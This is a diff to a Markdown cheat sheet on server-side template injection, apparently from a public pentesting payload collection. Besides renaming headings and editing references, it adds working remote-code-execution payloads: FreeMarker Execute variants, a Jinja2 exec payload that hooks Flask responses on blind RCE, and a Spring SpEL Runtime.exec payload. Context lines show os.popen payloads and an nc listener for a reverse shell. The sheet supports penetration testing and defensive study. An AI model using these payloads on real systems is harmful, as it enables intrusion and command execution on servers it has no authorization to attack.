@@ -1,4 +1,4 @@
-# Templates Injections
+# Server Side Template Injection
 
 > Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
 
@@ -33,7 +33,7 @@
     - [Java - Basic injection](#java---basic-injection)
     - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
     - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
-  - [Django Template](#django-template)
+  - [Django Templates](#django-templates)
   - [Python - Jinja2](#jinja2)
     - [Jinja2 - Basic injection](#jinja2---basic-injection)
     - [Jinja2 - Template format](#jinja2---template-format)
@@ -43,6 +43,7 @@
     - [Jinja2 - Read remote file](#jinja2---read-remote-file)
     - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
     - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
       - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
       - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
       - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
@@ -71,7 +72,8 @@
     - [Twig - Template format](#twig---template-format)
     - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
     - [Twig - Code execution](#twig---code-execution)
-  - [Java - Velocity](#velocity)
+  - [Java - Velocity](#java---velocity)
+  - [Java - Spring](#java---spring)
   - [PHP - patTemplate](#pattemplate)
   - [PHP - PHPlib](#phplib-and-html_template_phplib)
   - [PHP - Plates](#plates)
@@ -198,7 +200,11 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 ### Freemarker - Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`.
+The template can be :
+
+* Default: `${3*3}`  
+* Legacy: `#{3*3}`
+* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
 
 ### Freemarker - Read File
 
@@ -213,6 +219,8 @@ Convert the returned bytes to ASCII
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
 ```
 
 ### Freemarker - Sandbox bypass
@@ -496,15 +504,30 @@ Listen for connection
 nc -lnvp 8000
 ```
 
+#### Jinja2 - Forcing output on blind RCE
+
+You can import Flask functions to return an output from the vulnerable page.
+
+```py
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+
+
 #### Exploit the SSTI by calling os.popen().read()
 
 These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -512,9 +535,7 @@ We can use these shorter payloads (this is the shorter payloads known yet):
 
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
-
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
-
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
@@ -930,7 +951,7 @@ email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 
 ---
 
-## Velocity
+## Java - Velocity
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 > Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
@@ -944,6 +965,16 @@ $ex.waitFor()
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
 #end
+```
+
+---
+
+
+## Java - Spring
+
+```python
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
 
 ---
@@ -1071,13 +1102,11 @@ layout template:
 ## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
-* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
 * [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
 * [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
 * [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
+* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 * [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
-* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
 * [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
 * [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
@@ -1092,3 +1121,4 @@ layout template:
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
 * [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
+* [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
